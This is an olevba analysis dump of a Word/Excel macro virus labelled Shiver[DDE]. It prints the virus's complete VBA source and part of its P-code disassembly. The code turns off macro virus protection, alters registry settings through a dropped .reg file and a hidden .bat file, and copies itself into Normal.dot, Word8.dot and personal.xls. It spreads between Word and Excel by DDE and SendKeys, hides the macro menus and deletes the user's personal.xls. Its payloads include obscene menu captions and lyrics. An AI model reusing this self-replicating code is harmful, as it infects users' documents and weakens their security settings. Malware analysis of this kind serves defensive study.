olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Shiver
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Shiver - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Shiver - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Shiver - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Shiver - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSOffice.Shiver - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal strClassName As String, ByVal lpWindowName As Any) As Long

Public ExcelFound, WordFound, Marker, JustRun As Boolean

Sub AutoExec()
On Error Resume Next
Call WordStealth
If UCase(Dir(Application.StartupPath & "\Word8.dot")) <> "WORD8.DOT" Then
Documents.Add Template:="", NewTemplate:=False
Open "c:\sentry.sys" For Output As 1
Print #1, "Attribute VB_Name = ""Sentry"""
Print #1, "Sub FileSave()"
Print #1, "On Error Resume Next"
Print #1, "If NormalTemplate.VBProject.VBComponents.Item(""Module1"").Name <> ""Module1"" Then"
Print #1, "NormalTemplate.VBProject.VBComponents.Import ""c:\shiver.sys"""
Print #1, "End If"
Print #1, "ActiveDocument.Save"
Print #1, "End Sub"
Close 1
ActiveDocument.VBProject.VBComponents.Import "c:\sentry.sys"
ActiveDocument.SaveAs FileName:=Application.StartupPath & "\Word8.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
Windows("Word8.dot").Close
End If
End Sub

Sub AutoOpen()

Dim Set1 As Long

On Error Resume Next

Call wdTrigger

Set1 = &H0

Options.VirusProtection = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = Set1

Options.SaveNormalPrompt = False
Options.ConfirmConversions = False

Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\shiver.sys"

AI = True
NI = True

If NormalTemplate.VBProject.VBComponents.Item("Module1").Name <> "Module1" Then NI = False
If ActiveDocument.VBProject.VBComponents.Item("Module1").Name <> "Module1" Then AI = False

Call WordStealth

If NI = False Then
NormalTemplate.VBProject.VBComponents.Import "c:\shiver.sys"
End If

If AI = False Then
ActiveDocument.VBProject.VBComponents.Import "c:\shiver.sys"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

End Sub

Sub WordStealth()
Yin = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Yin < 4 Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString "Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub FileTemplates()" & vbCr & "End Sub" & vbCr & "Sub ViewVBCode()" & vbCr & "End Sub"
End If
End Sub

Sub AutoExit()

Randomize

On Error GoTo out

Call CheckMarker

hWnd = FindApp("XLMain")

If hWnd <> 0 Then ExcelFound = True

If ExcelFound = False And Marker = False Then

Application.WindowState = wdWindowStateMinimize

Call PersonalFun
Shell (Application.Path + "\Excel.exe"), vbMinimizedFocus
Do While ExcelFound = False
    Call FindExcel
Loop

Application.DDETerminateAll

CNL = Application.DDEInitiate("Excel", "system")
Application.DDEExecute CNL, "[New(4)]"
Application.DDETerminate CNL

CNL = Application.DDEInitiate("Excel", "Macro1")
Application.DDEPoke CNL, Item:="R1C1", Data:="=VBA.INSERT.FILE(""c:\shiver.sys"")"
Application.DDEPoke CNL, Item:="R2C1", Data:="=SAVE.AS(""" & Application.Path & "\xlstart\personal.xls"")"
Application.DDEPoke CNL, Item:="R3C1", Data:="=Return()"
DDEExecute channel:=CNL, Command:="[Run(""R1C1"")]"
Application.DDETerminate CNL

CNL = Application.DDEInitiate("Excel", "system")
Application.DDEExecute CNL, "[RUN(""Personal.xls!PXL_Done"")]"
Application.DDETerminate CNL

Call MakeMarker

JustRun = True

End If

out:

If (Int(Rnd * 30) = 5) Then Call wdReEvalInfection

End Sub

Sub FindExcel()
On Error Resume Next
For x = 1 To 50
    w = Tasks.Item(x)
    If Mid(w, 1, 15) = "Microsoft Excel" Then
        ExcelFound = True
        Exit Sub
    End If
Next x
End Sub

Function FindApp(ByVal varClassName As Variant) As Long
   If IsNull(varClassName) Then
      FindApp = 0
   Else
      FindApp = FindWindow(CStr(varClassName), 0&)
   End If
End Function


Sub PersonalFun()
PSLIVE = Application.Path + "\xlstart\personal.xls"
PS = Dir(PSLIVE)
If "PERSONAL.XLS" = UCase(PS) Then
Kill PSLIVE
End If
End Sub

Sub CheckMarker()
If Application.Application = "Microsoft Word" Then
mkr = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]")
Else
mkr = GetSetting("Office", "8.0", "Shiver[DDE]")
End If
If mkr = "ALT-F11" Then Marker = True
End Sub

Sub MakeMarker()
If Application.Application = "Microsoft Word" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]") = "ALT-F11"
Else
SaveSetting "Office", "8.0", "Shiver[DDE]", "ALT-F11"
End If
End Sub

Sub PXL_Done()
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
Application.Quit
End Sub

Sub Auto_Open()
Application.OnSheetActivate = "ShiverTime"
End Sub

Sub ShiverTime()

Randomize

On Error Resume Next

Call xlTrigger

If UCase(Mid(ActiveWorkbook.Name, 1, 4)) = "BOOK" Then GoTo out:

Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\shiver.sys"

CommandBars("Window").Controls("Unhide...").Enabled = False
CommandBars("Tools").Controls("Macro").Enabled = False

If UCase(Dir(Application.StartupPath + "\personal.xls")) = UCase("personal.xls") Then PXLS = True

For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).Name = "Module1" Then SXLS = True
Next i

If SXLS = False Then
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWorkbook.Save
End If

If PXLS = False Then
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\personal.xls", FileFormat:=xlNormal, AddToMru:=False
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
End If

out:

If UCase(Dir("c:\o6.reg")) <> "O6.REG" Or UCase(Dir("c:\o6.bat")) <> "O6.BAT" Then

Open "c:\o6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1

Open "c:\o6.bat" For Output As 1
Print #1, "regedit /s c:\o6.reg"
Close 1
End If

End Sub

Sub wdTrigger()
On Error Resume Next
Randomize
Application.EnableCancelKey = wdCancelDisabled
ShowVisualBasicEditor = False
If Int(Rnd * 75) = 60 Then
CommandBars("Tools").Controls("Macro").Caption = "Shiver[DDE] by ALT-F11"
CommandBars("File").Controls("Versions...").Caption = "Cum Stained Sheets..."
CommandBars("Edit").Controls("Paste Special...").Caption = "Hey Man I Did Your Mom..."
CommandBars("Insert").Controls("Break...").Caption = "Wanna do some MDMA ?"
CommandBars("Help").Controls("About Microsoft Word").Caption = "Peace, Love and Drugs"
CommandBars("File").Controls("Properties").Caption = "I'll die happy, you'll just die"
CommandBars("Edit").Controls("Go To...").Caption = "Heywood Jablowmi"
CommandBars("Tools").Controls("Word Count...").Caption = "Body Count"
CommandBars("Format").Controls("Font...").Caption = "Cunt"
CommandBars("File").Controls("Close").Caption = "No Clothes"
CommandBars("Window").Controls("Split").Caption = "Blow Me"
CommandBars("Insert").Controls("Picture").Caption = "Crusty Porn GIF"
CommandBars("File").Controls("Print...").Caption = "My Balls Itch"
CommandBars("Format").Controls("Bullets and Numbering...").Caption = "Pills And Needles"
CommandBars("Table").Controls("Insert Table...").Caption = "Insert and Probe"
CommandBars("Tools").Controls("Customize...").Caption = "Sodomize..."
CommandBars("Tools").Controls("Spelling and Grammar...").Caption = "Spelling and Your Grandma..."
CommandBars("View").Controls("Toolbars").Caption = "Gaybars"
CommandBars("View").Controls("Master Document").Caption = "Masturbation"
ElseIf Int(Rnd * 400) = 188 Then
Open "c:\sister.dll" For Output As 1
Print #1, "Hey Man, I Kinda Like Your Sister"
Print #1, "Hey Man, I Hope That's Cool"
Print #1, "Hey Man, I Kinda Lose My Mind"
Print #1, "Every Single Time I Find Your Sister"
Print #1, "Suntanned By The Pool"
Print #1, "Hey Man, I Wanna See Her Naked"
Print #1, "Hey Man, I'm Always In Her Room"
Print #1, "All Alone When No One's There"
Print #1, "Going Through Her Underwear"
Print #1, "Hey Man, I Gotta See Her Soon"
Print #1, "Hey Man, I'll Never Get Her Pregnant"
Print #1, "But Hey Man, How Can I Resist Her"
Print #1, "The Day I Give Her A Wedding Band"
Print #1, "Are You Going To Be My Best Man?"
Print #1, "Hey Man, I Kinda Like Your Sister"
Print #1, "I Kinda Like Your Sister"
Print #1, "I Kinda Like Your Sister"
Print #1, "I Kinda Like Her"
Close 1
Shell "write c:\sister.dll", vbMaximizedFocus
End If
End Sub

Sub xlTrigger()
On Error Resume Next
Randomize
Application.EnableCancelKey = xlDisabled
If Int(Rnd * 800) = 601 Then
For x = 1 To 30
RR = (Chr(65 + Int(Rnd * 12))) & x
Range(RR).AddComment
Range(RR).Comment.Visible = True
Range(RR).Comment.Text Text:="Shiver[DDE] by ALT-F11"
Range(RR).Comment.Shape.Select True
Selection.ShapeRange.IncrementLeft Int(Rnd * 300)
Selection.ShapeRange.IncrementTop Int(Rnd * 300)
Next x
End If
End Sub


Sub Auto_Close()

On Error GoTo out

Call CheckMarker

hWnd = FindApp("OpusApp")

If hWnd <> 0 Then WordFound = True

If WordFound = False And Marker = False Then

Shell Application.Path & "\winword.exe", vbMinimizedFocus
CNL = Application.DDEInitiate("MSWord", "system")
Application.DDEExecute CNL, "[fileclose]"
Application.DDEExecute CNL, "[Sendkeys ""%{F11}""]"
Application.DDEExecute CNL, "[Sendkeys ""^m""]"
Call delay
SendKeys "c:\shiver.sys", Wait
SendKeys "%o"
Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""y""]"
Application.DDETerminate CNL

Call MakeMarker

JustRun = True

End If

out:

On Error Resume Next
Shell "c:\o6.bat", vbHide

If (Int(Rnd * 30) = 5) Then Call xlReEvalInfection

End Sub

Sub delay()
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + 2
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
End Sub

Sub wdReEvalInfection()
If UCase(Dir(Application.Path + "\xlstart\personal.xls")) <> "PERSONAL.XLS" And Marker = True And JustRun <> True Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]") = "NoNoNo"
End If
End Sub

Sub xlReEvalInfection()
If UCase(Dir(Application.Path & "\startup\Word8.dot")) <> "WORD8.DOT" And Marker = True And JustRun <> True Then
SaveSetting "Office", "8.0", "Shiver[DDE]", "NoNoNo"
End If
End Sub

Sub DDE_Info()

' Shiver[DDE] by ALT-F11 with help from ALT-F4
' This is the first virus produced by The Alternative Virus Mafia (AVM)
'       ALT-F4 - "I was born for dying"
'       ALT-F11 - "Actions without thoughts"

End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Shiver
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 965 bytes
' _VBA_PROJECT_CUR/VBA/Sheet1 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet2 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet3 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Module1 - 20421 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Declare Function FindWindow Lib "user32" (ByVal strClassName As String, ByVal lpWindowName As ) As Long)
' Line #2:
' Line #3:
' 	Dim (Public) 
' 	VarDefn ExcelFound
' 	VarDefn WordFound
' 	VarDefn Marker
' 	VarDefn JustRun (As Boolean)
' Line #4:
' Line #5:
' 	FuncDefn (Sub AutoExec())
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	ArgsCall (Call) WordStealth 0x0000 
' Line #8:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000A "\Word8.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0009 "WORD8.DOT"
' 	Ne 
' 	IfBlock 
' Line #9:
' 	LitStr 0x0000 ""
' 	ParamNamed Template 
' 	LitVarSpecial (False)
' 	ParamNamed NewTemplate 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0002 
' Line #10:
' 	LitStr 0x000D "c:\sentry.sys"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #11:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "Attribute VB_Name = "Sentry""
' 	PrintItemNL 
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub FileSave()"
' 	PrintItemNL 
' Line #13:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004F "If NormalTemplate.VBProject.VBComponents.Item("Module1").Name <> "Module1" Then"
' 	PrintItemNL 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003C "NormalTemplate.VBProject.VBComponents.Import "c:\shiver.sys""
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "ActiveDocument.Save"
' 	PrintItemNL 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #19:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #20:
' 	LitStr 0x000D "c:\sentry.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #21:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000A "\Word8.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #22:
' 	LitStr 0x0009 "Word8.dot"
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	EndSub 
' Line #25:
' Line #26:
' 	FuncDefn (Sub AutoOpen())
' Line #27:
' Line #28:
' 	Dim 
' 	VarDefn Set1 (As Long)
' Line #29:
' Line #30:
' 	OnError (Resume Next) 
' Line #31:
' Line #32:
' 	ArgsCall (Call) wdTrigger 0x0000 
' Line #33:
' Line #34:
' 	LitHI2 0x0000 
' 	St Set1 
' Line #35:
' Line #36:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #37:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0007 "Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt ProfileString 0x0002 
' Line #38:
' Line #39:
' 	Ld Set1 
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #40:
' Line #41:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #42:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #43:
' Line #44:
' 	LitStr 0x000D "c:\shiver.sys"
' 	LitStr 0x0007 "Module1"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #45:
' Line #46:
' 	LitVarSpecial (True)
' 	St AI 
' Line #47:
' 	LitVarSpecial (True)
' 	St NI 
' Line #48:
' Line #49:
' 	LitStr 0x0007 "Module1"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Module1"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St NI 
' 	EndIf 
' Line #50:
' 	LitStr 0x0007 "Module1"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Module1"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St AI 
' 	EndIf 
' Line #51:
' Line #52:
' 	ArgsCall (Call) WordStealth 0x0000 
' Line #53:
' Line #54:
' 	Ld NI 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #55:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' 	Ld AI 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #60:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #61:
' 	EndIfBlock 
' Line #62:
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Sub WordStealth())
' Line #66:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Yin 
' Line #67:
' 	Ld Yin 
' 	LitDI2 0x0004 
' 	Lt 
' 	IfBlock 
' Line #68:
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0013 "Sub FileTemplates()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	EndSub 
' Line #71:
' Line #72:
' 	FuncDefn (Sub AutoExit())
' Line #73:
' Line #74:
' 	ArgsCall Read 0x0000 
' Line #75:
' Line #76:
' 	OnError out 
' Line #77:
' Line #78:
' 	ArgsCall (Call) CheckMarker 0x0000 
' Line #79:
' Line #80:
' 	LitStr 0x0006 "XLMain"
' 	ArgsLd FindApp 0x0001 
' 	St hWnd 
' Line #81:
' Line #82:
' 	Ld hWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ExcelFound 
' 	EndIf 
' Line #83:
' Line #84:
' 	Ld ExcelFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Marker 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #85:
' Line #86:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #87:
' Line #88:
' 	ArgsCall (Call) PersonalFun 0x0000 
' Line #89:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x000A "\Excel.exe"
' 	Add 
' 	Paren 
' 	Ld vbMinimizedFocus 
' 	ArgsCall Shell 0x0002 
' Line #90:
' 	Ld ExcelFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	DoWhile 
' Line #91:
' 	ArgsCall (Call) FindExcel 0x0000 
' Line #92:
' 	Loop 
' Line #93:
' Line #94:
' 	Ld Application 
' 	ArgsMemCall DDETerminateAll 0x0000 
' Line #95:
' Line #96:
' 	LitStr 0x0005 "Excel"
' 	LitStr 0x0006 "system"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #97:
' 	Ld CNL 
' 	LitStr 0x0008 "[New(4)]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #98:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #99:
' Line #100:
' 	LitStr 0x0005 "Excel"
' 	LitStr 0x0006 "Macro1"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #101:
' 	Ld CNL 
' 	LitStr 0x0004 "R1C1"
' 	ParamNamed Item 
' 	LitStr 0x0021 "=VBA.INSERT.FILE("c:\shiver.sys")"
' 	ParamNamed Data 
' 	Ld Application 
' 	ArgsMemCall DDEPoke 0x0003 
' Line #102:
' 	Ld CNL 
' 	LitStr 0x0004 "R2C1"
' 	ParamNamed Item 
' 	LitStr 0x000A "=SAVE.AS(""
' 	Ld Application 
' 	MemLd Path 
' 	Concat 
' 	LitStr 0x0017 "\xlstart\personal.xls")"
' 	Concat 
' 	ParamNamed Data 
' 	Ld Application 
' 	ArgsMemCall DDEPoke 0x0003 
' Line #103:
' 	Ld CNL 
' 	LitStr 0x0004 "R3C1"
' 	ParamNamed Item 
' 	LitStr 0x0009 "=Return()"
' 	ParamNamed Data 
' 	Ld Application 
' 	ArgsMemCall DDEPoke 0x0003 
' Line #104:
' 	Ld CNL 
' 	ParamNamed channel 
' 	LitStr 0x000D "[Run("R1C1")]"
' 	ParamNamed Command 
' 	ArgsCall DDEExecute 0x0002 
' Line #105:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #106:
' Line #107:
' 	LitStr 0x0005 "Excel"
' 	LitStr 0x0006 "system"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #108:
' 	Ld CNL 
' 	LitStr 0x001E "[RUN("Personal.xls!PXL_Done")]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #109:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #110:
' Line #111:
' 	ArgsCall (Call) MakeMarker 0x0000 
' Line #112:
' Line #113:
' 	LitVarSpecial (True)
' 	St JustRun 
' Line #114:
' Line #115:
' 	EndIfBlock 
' Line #116:
' Line #117:
' 	Label out 
' Line #118:
' Line #119:
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0005 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) wdReEvalInfection 0x0000 
' 	EndIf 
' Line #120:
' Line #121:
' 	EndSub 
' Line #122:
' Line #123:
' 	FuncDefn (Sub FindExcel())
' Line #124:
' 	OnError (Resume Next) 
' Line #125:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	For 
' Line #126:
' 	Ld x 
' 	Ld Tasks 
' 	ArgsMemLd Item 0x0001 
' 	St w 
' Line #127:
' 	Ld w 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x000F "Microsoft Excel"
' 	Eq 
' 	IfBlock 
' Line #128:
' 	LitVarSpecial (True)
' 	St ExcelFound 
' Line #129:
' 	ExitSub 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #132:
' 	EndSub 
' Line #133:
' Line #134:
' 	FuncDefn (Function FindApp(ByVal varClassName As Variant) As Long)
' Line #135:
' 	Ld varClassName 
' 	ArgsLd IsNull 0x0001 
' 	IfBlock 
' Line #136:
' 	LitDI2 0x0000 
' 	St FindApp 
' Line #137:
' 	ElseBlock 
' Line #138:
' 	Ld varClassName 
' 	Coerce (Str) 
' 	LitDI4 0x0000 0x0000 
' 	ArgsLd FindWindow 0x0002 
' 	St FindApp 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	EndFunc 
' Line #141:
' Line #142:
' Line #143:
' 	FuncDefn (Sub PersonalFun())
' Line #144:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0015 "\xlstart\personal.xls"
' 	Add 
' 	St PSLIVE 
' Line #145:
' 	Ld PSLIVE 
' 	ArgsLd Dir 0x0001 
' 	St PS 
' Line #146:
' 	LitStr 0x000C "PERSONAL.XLS"
' 	Ld PS 
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	IfBlock 
' Line #147:
' 	Ld PSLIVE 
' 	ArgsCall Kill 0x0001 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	EndSub 
' Line #150:
' Line #151:
' 	FuncDefn (Sub CheckMarker())
' Line #152:
' 	Ld Application 
' 	MemLd Application 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #153:
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St mkr 
' Line #154:
' 	ElseBlock 
' Line #155:
' 	LitStr 0x0006 "Office"
' 	LitStr 0x0003 "8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	ArgsLd GetSetting 0x0003 
' 	St mkr 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	Ld mkr 
' 	LitStr 0x0007 "ALT-F11"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Marker 
' 	EndIf 
' Line #158:
' 	EndSub 
' Line #159:
' Line #160:
' 	FuncDefn (Sub MakeMarker())
' Line #161:
' 	Ld Application 
' 	MemLd Application 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #162:
' 	LitStr 0x0007 "ALT-F11"
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #163:
' 	ElseBlock 
' Line #164:
' 	LitStr 0x0006 "Office"
' 	LitStr 0x0003 "8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	LitStr 0x0007 "ALT-F11"
' 	ArgsCall SaveSetting 0x0004 
' Line #165:
' 	EndIfBlock 
' Line #166:
' 	EndSub 
' Line #167:
' Line #168:
' 	FuncDefn (Sub PXL_Done())
' Line #169:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #170:
' 	LitStr 0x000C "personal.xls"
